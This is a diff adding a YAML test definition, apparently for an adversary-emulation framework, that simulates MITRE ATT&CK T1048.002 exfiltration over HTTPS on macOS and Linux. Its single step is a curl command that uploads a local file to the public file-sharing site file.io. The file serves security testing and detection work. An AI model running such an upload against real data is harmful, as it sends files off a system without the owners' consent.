@@ -1,0 +1,28 @@
+api_version: "2.0"
+name: Exfiltrate data HTTPS using curl freebsd,linux or macos
+description: |
+    Exfiltrate data HTTPS using curl to file share site file.io
+args:
+    - name: input_file
+      type: path
+      default: PathToAtomicsFolder/T1048.002/src/artifact
+uuid: 4a4f31e2-46ea-4c26-ad89-f09ad1d5fe01
+mitre:
+    tactics:
+        - 'TA0010: Exfiltration'
+    techniques:
+        - 'T1048: Exfiltration Over Alternative Protocol'
+    subtechniques:
+        - 'T1048.002: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol'
+requirements:
+    platforms:
+        - os: macos
+        - os: linux
+steps:
+    - name: exfiltrate-data-https-using-curl-freebsd,linux-or-macos
+      inline: |
+        curl -F 'file=@{{.Args.input_file}}' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/
+      executor: bash
+      cleanup:
+        inline: ""
+        executor: bash
